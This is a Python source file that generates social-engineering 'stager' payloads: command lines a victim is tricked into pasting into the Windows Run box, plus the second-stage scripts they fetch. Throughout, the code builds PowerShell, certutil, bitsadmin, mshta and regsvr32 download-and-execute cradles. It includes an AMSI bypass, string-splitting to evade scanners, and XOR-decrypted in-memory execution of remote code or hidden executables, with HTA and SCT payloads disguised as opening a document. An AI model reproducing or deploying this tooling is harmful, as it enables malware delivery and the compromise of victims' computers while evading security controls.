# language: Python 3.11+, file: cf/stager.py
# *stager builders — what the victim pastes into Win+R, and what comes back*
from __future__ import annotations

import base64
import hashlib

KINDS = (
    "ps",
    "psenc",
    "irm",
    "curl",
    "certutil",
    "bitsadmin",
    "hta",
    "sct",
)

# every kind whose layer-2 body is the powershell loader
PS_KINDS = frozenset({"ps", "psenc", "irm", "curl", "certutil", "bitsadmin"})

# stage2 handling styles for the served loader
STAGE2_TYPES = ("ps", "exe", "dotnet", "none")


def _b64_utf16le(text: str) -> str:
    return base64.b64encode(text.encode("utf-16le")).decode("ascii")


def _split_obfs(text: str, pieces: int = 3) -> str:
    """Chunk a literal so it never appears whole in a scan: 'a'+'bc'."""
    if len(text) < pieces * 3:
        pieces = 1
    size = max(1, len(text) // pieces)
    parts = [text[i : i + size] for i in range(0, len(text), size)]
    return "+".join(f"'{p}'" for p in parts)


def xor_key(token: str) -> bytes:
    """16-byte key derived from the target token — the operator prep-encrypts
    stage2 with it, the loader decrypts in memory."""
    return hashlib.sha256(token.encode("utf-8")).digest()[:16]


def xor_bytes(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("xor key is empty")
    n = len(key)
    return bytes(b ^ key[i % n] for i, b in enumerate(data))


def _ps_byte_array(key: bytes) -> str:
    return ",".join(str(b) for b in key)


class Stager:
    """Two layers:
      layer 1 — the Win+R command line (short, optionally url-free)
      layer 2 — the body served at /s/... (loader, callbacks, stage2)
    """

    @staticmethod
    def command(kind: str, url: str) -> str:
        if kind == "ps":
            return (
                "powershell -w h -nop -ep bypass -c \"iex(iwr -useb "
                f"'{url}')\""
            )
        if kind == "psenc":
            inner = f"$u='{url}';iex(iwr -useb $u)"
            return f"powershell -w h -nop -ep bypass -enc {_b64_utf16le(inner)}"
        if kind == "irm":
            return f"powershell -w h -nop -ep bypass -c \"irm '{url}'|iex\""
        if kind == "curl":
            return f"curl -fsSL '{url}'|powershell -w h -nop -ep bypass -"
        if kind == "certutil":
            return (
                f"cmd /c certutil -urlcache -f {url} %TEMP%\\c.ps1"
                "&powershell -w h -nop -ep bypass -f %TEMP%\\c.ps1"
            )
        if kind == "bitsadmin":
            return (
                f"bitsadmin /transfer c /download /priority high {url} %TEMP%\\c.ps1"
                "&powershell -w h -nop -ep bypass -f %TEMP%\\c.ps1"
            )
        if kind == "hta":
            return f"mshta {url}.hta"
        if kind == "sct":
            return f"regsvr32 /s /n /u /i:{url} scrobj.dll"
        raise ValueError(f"unknown stager kind: {kind}")

    @staticmethod
    def loader(
        kind: str,
        *,
        token: str,
        hit_url: str,
        stage2_url: str = "",
        stage2_type: str = "none",
        amsi: bool = True,
        label: str = "",
        obfuscate: bool = False,
    ) -> tuple[str, str]:
        """Returns (content_type, body) for the /s/... route."""
        if stage2_type not in STAGE2_TYPES:
            raise ValueError(f"unknown stage2 type: {stage2_type}")
        if kind in PS_KINDS:
            return "text/plain; charset=utf-8", Stager._ps_loader(
                hit_url, stage2_url, stage2_type, amsi,
                token=token, obfuscate=obfuscate,
            )
        if kind == "hta":
            return "application/hta; charset=utf-8", Stager._hta(
                hit_url, stage2_url, stage2_type, token, label
            )
        if kind == "sct":
            return "text/xml; charset=utf-8", Stager._sct(
                hit_url, stage2_url, stage2_type, token
            )
        raise ValueError(f"unknown stager kind: {kind}")

    # ─── layer 2 : powershell ───
    @staticmethod
    def _ps_loader(
        hit_url: str,
        stage2_url: str,
        stage2_type: str,
        amsi: bool,
        *,
        token: str = "",
        obfuscate: bool = False,
    ) -> str:
        hit = _split_obfs(hit_url)
        lines = [
            "$ErrorActionPreference='SilentlyContinue'",
            (
                "$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0 "
                "(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36')"
            ),
        ]
        if amsi:
            lines += [
                "try{",
                "$t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');",
                "if($t){$f=$t.GetField('amsiInitFailed','NonPublic,Static');",
                "if($f){$f.SetValue($null,$true)}}",
                "}catch{}",
            ]
        lines.append(f"try{{$w.DownloadData({hit})|Out-Null}}catch{{}}")
        if stage2_type != "none" and stage2_url:
            s2 = _split_obfs(stage2_url)
            if stage2_type == "ps" and obfuscate and token:
                key = _ps_byte_array(xor_key(token))
                lines += [
                    "try{$b=$w.DownloadData(" + s2 + ");",
                    f"$k=[byte[]]({key});",
                    "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % $k.Length]};",
                    "iex([Text.Encoding]::UTF8.GetString($b))}catch{}",
                ]
            elif stage2_type == "ps":
                lines.append(f"try{{iex($w.DownloadString({s2}))}}catch{{}}")
            elif stage2_type == "dotnet":
                lines.append(
                    "try{$b=$w.DownloadData("
                    f"{s2});[Reflection.Assembly]::Load($b).EntryPoint.Invoke("
                    "$null,@())}catch{{}}"
                )
            elif stage2_type == "exe":
                lines += [
                    f"try{{$b=$w.DownloadData({s2});",
                    "$p=Join-Path $env:TEMP (Get-Random).ToString()+'.exe';",
                    "[IO.File]::WriteAllBytes($p,$b);",
                    "Start-Process $p -WindowStyle Hidden}catch{}",
                ]
        return "\n".join(lines) + "\n"

    # ─── layer 2 : HTA ───
    @staticmethod
    def _hta(
        hit_url: str, stage2_url: str, stage2_type: str, token: str, label: str
    ) -> str:
        run = ""
        if stage2_type == "ps" and stage2_url:
            run = (
                "var s=new ActiveXObject('WScript.Shell');"
                "var c=\"powershell -w h -nop -ep bypass -c \\\"iex("
                "(new Net.WebClient).DownloadString('" + stage2_url + "'))\\\"\";"
                "s.Run(c,0,false);"
            )
        suffix = f" — {label}" if label else ""
        return f"""<html>
<head><title>Document</title>
<HTA:APPLICATION ID="cf" APPLICATIONNAME="Document" BORDER="thin"
  SCROLL="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"/>
<script language="VBScript">
Sub Window_OnLoad
  On Error Resume Next
  Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  h.SetOption 2, 13056
  h.Open "GET", "{hit_url}", False
  h.Send
  {run}
  window.close
End Sub
</script>
</head>
<body style="font-family:Segoe UI,sans-serif;font-size:12px">
Opening document{suffix}…
</body>
</html>
"""

    # ─── layer 2 : SCT (regsvr32) ───
    @staticmethod
    def _sct(
        hit_url: str, stage2_url: str, stage2_type: str, token: str
    ) -> str:
        payload = ""
        if stage2_type == "ps" and stage2_url:
            payload = (
                "var sh=new ActiveXObject('WScript.Shell');"
                "sh.Run(\"powershell -w h -nop -ep bypass -c \\\"iex("
                "(new Net.WebClient).DownloadString('" + stage2_url + "'))\\\"\",0,false);"
            )
        return f"""<?xml version="1.0"?>
<registration
  progid="Cf.Loader"
  classid="{{00000000-0000-0000-0000-000000000000}}"
  remotable="yes">
<script language="JScript">
<![CDATA[
var x = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
x.open("GET", "{hit_url}", false);
try {{ x.send(); }} catch (e) {{}}
{payload}
]]>
</script>
</registration>
"""

    @staticmethod
    def kinds() -> dict[str, str]:
        return {
            "ps": "powershell one-liner, url visible in the command line",
            "psenc": "powershell -enc: url lives inside the base64 blob",
            "irm": "powershell irm|iex — modern default cradle, short line",
            "curl": "curl.exe piped into powershell — no download cradle keyword",
            "certutil": "certutil -urlcache drop + powershell run — lolbin, noisy",
            "bitsadmin": "bitsadmin /transfer drop + powershell run — survives logoff",
            "hta": "mshta <url>.hta — no powershell on the command line",
            "sct": "regsvr32 /i:<url> scrobj.dll — short, scriptlet host",
        }
